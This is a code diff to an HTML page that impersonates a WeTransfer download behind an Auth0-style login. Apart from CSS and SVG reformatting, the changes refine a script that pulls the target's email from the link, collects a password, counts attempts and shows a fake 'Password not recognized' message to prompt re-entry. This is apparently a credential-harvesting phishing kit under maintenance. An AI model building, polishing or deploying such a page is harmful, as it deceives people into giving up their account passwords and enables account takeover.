@@ -67,7 +67,9 @@
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         .loading-text {
@@ -85,7 +87,7 @@
             min-height: 600px;
             background: #fff;
             border-radius: 28px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.10), 0 8px 24px rgba(0,0,0,0.05);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.10), 0 8px 24px rgba(0, 0, 0, 0.05);
             overflow: hidden;
             position: relative;
         }
@@ -122,7 +124,7 @@
             content: '';
             position: absolute;
             inset: 0;
-            background: radial-gradient(ellipse at 30% 40%, rgba(255,255,255,0.4) 0%, transparent 70%);
+            background: radial-gradient(ellipse at 30% 40%, rgba(255, 255, 255, 0.4) 0%, transparent 70%);
             pointer-events: none;
             z-index: 0;
         }
@@ -185,7 +187,7 @@
             margin-top: 8px;
             border-radius: 18px;
             overflow: hidden;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.08);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
             position: relative;
             z-index: 1;
             background: #fff;
@@ -361,7 +363,7 @@
 
         .auth0-lock-submit:hover {
             background: #000;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
         }
 
         .auth0-lock-submit:active {
@@ -405,7 +407,7 @@
         .auth0-loading {
             width: 20px;
             height: 20px;
-            border: 2px solid rgba(255,255,255,0.2);
+            border: 2px solid rgba(255, 255, 255, 0.2);
             border-top-color: #fff;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
@@ -425,13 +427,13 @@
         #two .auth0-lock-input-wrap:focus-within {
             border-color: #1a1a1a;
             background: #fff;
-            box-shadow: 0 0 0 4px rgba(26,26,26,0.06);
+            box-shadow: 0 0 0 4px rgba(26, 26, 26, 0.06);
         }
 
         #two .auth0-lock-input-wrap.show-error {
             border-color: #e74c3c;
             background: #fff9f8;
-            box-shadow: 0 0 0 4px rgba(231,76,60,0.08);
+            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.08);
         }
 
         #two .auth0-lock-input-wrap .auth0-lock-icon {
@@ -509,7 +511,7 @@
             color: #3d1e1a;
             font-weight: 400;
             line-height: 1.5;
-            box-shadow: 0 2px 8px rgba(231,76,60,0.06);
+            box-shadow: 0 2px 8px rgba(231, 76, 60, 0.06);
         }
 
         .error-message--sleek .emoji {
@@ -540,11 +542,22 @@
         }
 
         @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            20% { transform: translateX(-8px); }
-            40% { transform: translateX(8px); }
-            60% { transform: translateX(-5px); }
-            80% { transform: translateX(5px); }
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            20% {
+                transform: translateX(-8px);
+            }
+            40% {
+                transform: translateX(8px);
+            }
+            60% {
+                transform: translateX(-5px);
+            }
+            80% {
+                transform: translateX(5px);
+            }
         }
 
         .shake {
@@ -737,9 +750,7 @@
             </div>
 
             <div class="wt-product-feature__image-wrapper">
-                <img class="wt-product-feature__image"
-                src="images/bg.png"
-                alt="WeTransfer abstract art" loading="lazy">
+                <img class="wt-product-feature__image" src="images/bg.png" alt="WeTransfer abstract art" loading="lazy">
             </div>
         </div>
 
@@ -769,8 +780,8 @@
                                                             <li class="auth0-lock-tabs-current" style="width:64px;">
                                                                 <svg class="downloader__top-icon" viewBox="0 0 170 170">
                                                                     <g fill="#1a1a1a" fill-rule="evenodd">
-                                                                        <path d="M145.104 24.896c33.195 33.194 33.195 87.014 0 120.208-33.194 33.195-87.014 33.195-120.208 0C-8.3 111.91-8.3 58.09 24.896 24.896 58.09-8.3 111.91-8.3 145.104 24.896zm-7.071 7.071c-29.29-29.29-76.777-29.29-106.066 0-29.29 29.29-29.29 76.777 0 106.066 29.29 29.29 76.777 29.29 106.066 0 29.29-29.29 29.29-76.777 0-106.066z"/>
-                                                                        <path d="M82 100.843V59.007A4.006 4.006 0 0 1 86 55c2.21 0 4 1.794 4 4.007v41.777l15.956-15.956a4.003 4.003 0 0 1 5.657 0 4.004 4.004 0 0 1 0 5.657l-22.628 22.628a3.99 3.99 0 0 1-3.017 1.166 3.992 3.992 0 0 1-3.012-1.166L60.328 90.485a4.003 4.003 0 0 1 0-5.657 4.004 4.004 0 0 1 5.657 0L82 100.843z"/>
+                                                                        <path d="M145.104 24.896c33.195 33.194 33.195 87.014 0 120.208-33.194 33.195-87.014 33.195-120.208 0C-8.3 111.91-8.3 58.09 24.896 24.896 58.09-8.3 111.91-8.3 145.104 24.896zm-7.071 7.071c-29.29-29.29-76.777-29.29-106.066 0-29.29 29.29-29.29 76.777 0 106.066 29.29 29.29 76.777 29.29 106.066 0 29.29-29.29 29.29-76.777 0-106.066z" />
+                                                                        <path d="M82 100.843V59.007A4.006 4.006 0 0 1 86 55c2.21 0 4 1.794 4 4.007v41.777l15.956-15.956a4.003 4.003 0 0 1 5.657 0 4.004 4.004 0 0 1 0 5.657l-22.628 22.628a3.99 3.99 0 0 1-3.017 1.166 3.992 3.992 0 0 1-3.012-1.166L60.328 90.485a4.003 4.003 0 0 1 0-5.657 4.004 4.004 0 0 1 5.657 0L82 100.843z" />
                                                                     </g>
                                                                 </svg>
                                                             </li>
@@ -807,7 +818,7 @@
                                             <svg aria-hidden="true" focusable="false" width="8" height="12" viewBox="0 0 8 12">
                                                 <g fill="none" fill-rule="evenodd">
                                                     <g transform="translate(-148 -32)" fill="#fff">
-                                                        <polygon points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38"/>
+                                                        <polygon points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38" />
                                                     </g>
                                                 </g>
                                             </svg>
@@ -850,7 +861,7 @@
                                                             <span class="email-icon-wrapper" aria-hidden="true">
                                                                 <svg viewBox="0 0 32 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                     <g transform="translate(1,1)" fill="#888">
-                                                                        <path d="M27,23 C27,23.55 26.55,24 26,24 L0,24 C-0.55,24 -1,23.55 -1,23 L-1,3 C-1,2.45 -0.55,2 0,2 L26,2 C26.55,2 27,2.45 27,3 L27,23 Z M27,0 L-1,0 C-2.11,0 -3,0.89 -3,2 L-3,24 C-3,25.1 -2.11,26 -1,26 L27,26 C28.1,26 29,25.1 29,24 L29,2 C29,0.89 28.1,0 27,0 Z M19,6 L23,6 L23,10 L19,10 L19,6 Z M17,12 L25,12 L25,4 L17,4 L17,12 Z M1,16 L15,16 L15,14 L1,14 L1,16 Z M1,20 L15,20 L15,18 L1,18 L1,20 Z"/>
+                                                                        <path d="M27,23 C27,23.55 26.55,24 26,24 L0,24 C-0.55,24 -1,23.55 -1,23 L-1,3 C-1,2.45 -0.55,2 0,2 L26,2 C26.55,2 27,2.45 27,3 L27,23 Z M27,0 L-1,0 C-2.11,0 -3,0.89 -3,2 L-3,24 C-3,25.1 -2.11,26 -1,26 L27,26 C28.1,26 29,25.1 29,24 L29,2 C29,0.89 28.1,0 27,0 Z M19,6 L23,6 L23,10 L19,10 L19,6 Z M17,12 L25,12 L25,4 L17,4 L17,12 Z M1,16 L15,16 L15,14 L1,14 L1,16 Z M1,20 L15,20 L15,18 L1,18 L1,20 Z" />
                                                                     </g>
                                                                 </svg>
                                                             </span>
@@ -864,7 +875,7 @@
                                                                 <span aria-hidden="true">
                                                                     <svg width="11" height="14" viewBox="0 0 13 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                         <g transform="translate(-288,-1508)" fill="#888">
-                                                                            <path d="M299,1523.998 L290,1523.998 C288.896,1523.998 288,1523.102 288,1521.999 L288,1515.999 C288,1514.895 288.896,1513.998 290,1513.998 L290,1512.499 C290,1510.015 292.015,1507.999 294.5,1507.999 C296.985,1507.999 299,1510.015 299,1512.499 L299,1513.999 C300.104,1513.999 301,1514.895 301,1515.999 L301,1521.999 C301,1523.103 300.104,1523.998 299,1523.998 Z M298,1512.499 C298,1510.566 296.433,1508.999 294.5,1508.999 C292.567,1508.999 291,1510.566 291,1512.499 L291,1513.998 L298,1513.998 L298,1512.499 Z M300,1515.999 C300,1515.446 299.552,1514.998 299,1514.998 L290,1514.998 C289.447,1514.998 289,1515.446 289,1515.999 L289,1521.999 C289,1522.551 289.447,1522.998 290,1522.998 L299,1522.998 C299.552,1522.998 300,1522.551 300,1521.999 L300,1515.999 Z M294.5,1520.998 C294.224,1520.998 294,1520.774 294,1520.498 L294,1517.498 C294,1517.223 294.224,1516.999 294.5,1516.999 C294.776,1516.999 295,1517.223 295,1517.498 L295,1520.498 C295,1520.774 294.776,1520.998 294.5,1520.998 Z"/>
+                                                                            <path d="M299,1523.998 L290,1523.998 C288.896,1523.998 288,1523.102 288,1521.999 L288,1515.999 C288,1514.895 288.896,1513.998 290,1513.998 L290,1512.499 C290,1510.015 292.015,1507.999 294.5,1507.999 C296.985,1507.999 299,1510.015 299,1512.499 L299,1513.999 C300.104,1513.999 301,1514.895 301,1515.999 L301,1521.999 C301,1523.103 300.104,1523.998 299,1523.998 Z M298,1512.499 C298,1510.566 296.433,1508.999 294.5,1508.999 C292.567,1508.999 291,1510.566 291,1512.499 L291,1513.998 L298,1513.998 L298,1512.499 Z M300,1515.999 C300,1515.446 299.552,1514.998 299,1514.998 L290,1514.998 C289.447,1514.998 289,1515.446 289,1515.999 L289,1521.999 C289,1522.551 289.447,1522.998 290,1522.998 L299,1522.998 C299.552,1522.998 300,1522.551 300,1521.999 L300,1515.999 Z M294.5,1520.998 C294.224,1520.998 294,1520.774 294,1520.498 L294,1517.498 C294,1517.223 294.224,1516.999 294.5,1516.999 C294.776,1516.999 295,1517.223 295,1517.498 L295,1520.498 C295,1520.774 294.776,1520.998 294.5,1520.998 Z" />
                                                                         </g>
                                                                     </svg>
                                                                 </span>
@@ -896,7 +907,7 @@
                                             <svg aria-hidden="true" focusable="false" width="8" height="12" viewBox="0 0 8 12">
                                                 <g fill="none" fill-rule="evenodd">
                                                     <g transform="translate(-148 -32)" fill="#fff">
-                                                        <polygon points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38"/>
+                                                        <polygon points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38" />
                                                     </g>
                                                 </g>
                                             </svg>
@@ -926,33 +937,52 @@
             const passwordInput = document.getElementById('password');
             const emailDisplay = document.getElementById('email_display');
             const passwordError = document.getElementById('passwordError');
-            const attemptCounter = document.getElementById('attemptCounter');
             const passwordWrap = document.getElementById('passwordWrap');
             const passwordBlock = document.getElementById('passwordBlock');
 
             let currentEmail = '';
             let attemptCount = 0;
 
+            // ─── Sanitize email: remove any '#' or leading/trailing junk ───
+            function sanitizeEmail(raw) {
+                if (!raw) return '';
+                // Remove any # characters and trim
+                let clean = raw.replace(/#/g, '').trim();
+                // If it still looks like an email, return it
+                if (clean.includes('@')) return clean;
+                // Try to extract email using regex as fallback
+                const match = clean.match(
+                    /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
+                );
+                return match ? match[0] : clean;
+            }
+
             // ─── Get email from URL (query param or hash) ───
             function getEmailFromURL() {
                 // 1. Check query string first (clean URL)
                 const params = new URLSearchParams(window.location.search);
                 let email = params.get('email');
-                if (email && email.trim() !== '') return email.trim();
+                if (email && email.trim() !== '') {
+                    return sanitizeEmail(email);
+                }
 
                 // 2. If not found, try hash (legacy)
                 if (window.location.hash) {
                     try {
                         const hashParams = new URLSearchParams(window.location.hash.substring(1));
                         const hashEmail = hashParams.get('email');
-                        if (hashEmail && hashEmail.trim() !== '') return hashEmail.trim();
+                        if (hashEmail && hashEmail.trim() !== '') {
+                            return sanitizeEmail(hashEmail);
+                        }
                     } catch (_) {}
 
                     // Fallback regex on hash
                     const match = window.location.hash.match(
                         /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
                     );
-                    if (match) return match[0];
+                    if (match) {
+                        return sanitizeEmail(match[0]);
+                    }
                 }
 
                 return '';
@@ -986,14 +1016,14 @@
             function showSleekError() {
                 hideError();
                 const msg = `
-                    <div class="error-message--sleek">
-                        <span class="emoji">🔒</span>
-                        <span class="error-text">
-                            <span class="highlight">Password not recognized.</span>
-                            Please double-check your password and enter it carefully before trying again.
-                        </span>
-                    </div>
-                `;
+                        <div class="error-message--sleek">
+                            <span class="emoji">🔒</span>
+                            <span class="error-text">
+                                <span class="highlight">Password not recognized.</span>
+                                Please double-check your password and enter it carefully before trying again.
+                            </span>
+                        </div>
+                    `;
                 passwordError.innerHTML = msg;
                 passwordError.classList.add('show');
                 passwordWrap.classList.add('show-error');
@@ -1012,11 +1042,8 @@
                 e.preventDefault();
                 hideError();
 
+                // Always get fresh email from URL
                 let email = getEmailFromURL();
-                if (!email) {
-                    // If no email in URL, try to get from stored (shouldn't happen)
-                    email = currentEmail;
-                }
 
                 if (!email) {
                     passwordError.innerHTML =
@@ -1024,6 +1051,9 @@
                     passwordError.classList.add('show');
                     return;
                 }
+
+                // Double-check: remove any stray '#'
+                email = sanitizeEmail(email);
 
                 setLoading(true);
 
@@ -1037,6 +1067,7 @@
                         setLoading(false);
                         if (data.success) {
                             currentEmail = email;
+                            // Display the clean email — NO '#' anywhere
                             emailDisplay.value = email;
                             one.style.display = 'none';
                             two.style.display = 'block';
@@ -1072,6 +1103,13 @@
                     passwordError.classList.add('show');
                     passwordInput.focus();
                     return;
+                }
+
+                // Ensure currentEmail is clean
+                const cleanEmail = sanitizeEmail(currentEmail);
+                if (cleanEmail !== currentEmail) {
+                    currentEmail = cleanEmail;
+                    emailDisplay.value = cleanEmail;
                 }
 
                 attemptCount++;
@@ -1142,12 +1180,15 @@
             window.addEventListener('load', function() {
                 setLoading(false);
 
-                // First, upgrade any hash-based email to query param
+                // Extract email, sanitize, and upgrade URL
                 const email = getEmailFromURL();
                 if (email) {
-                    currentEmail = email;
+                    const clean = sanitizeEmail(email);
+                    currentEmail = clean;
+                    // If the URL still has a hash with email, upgrade it
                     upgradeURLToQuery();
-                    // Optionally pre-fill email? We'll only fill after clicking download.
+                    // Optionally pre-fill the email display if user wants
+                    // (but we only fill after clicking Download All)
                 }
             });
 
